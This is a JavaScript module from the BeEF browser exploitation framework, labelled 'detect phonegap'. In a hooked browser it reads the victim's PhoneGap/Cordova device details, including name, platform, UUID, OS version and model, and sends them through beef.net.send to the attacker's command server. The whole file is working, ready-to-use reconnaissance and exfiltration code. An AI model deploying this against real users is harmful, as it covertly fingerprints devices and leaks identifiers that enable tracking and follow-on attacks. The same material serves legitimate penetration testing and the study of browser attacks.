//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// detect phonegap
//
beef.execute(function() {

    var phonegap_details;

    try {
        phonegap_details = ""
        + " name: " + device.name 
        + " phonegap api: " + device.phonegap
        + " cordova api: " + device.cordova
        + " platform: " + device.platform
        + " uuid: " + device.uuid
        + " version: " + device.version
	+ " model: " + device.model;
    } catch(e) {
        phonegap_details = "unable to detect phonegap";
    }

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap="+phonegap_details);

});
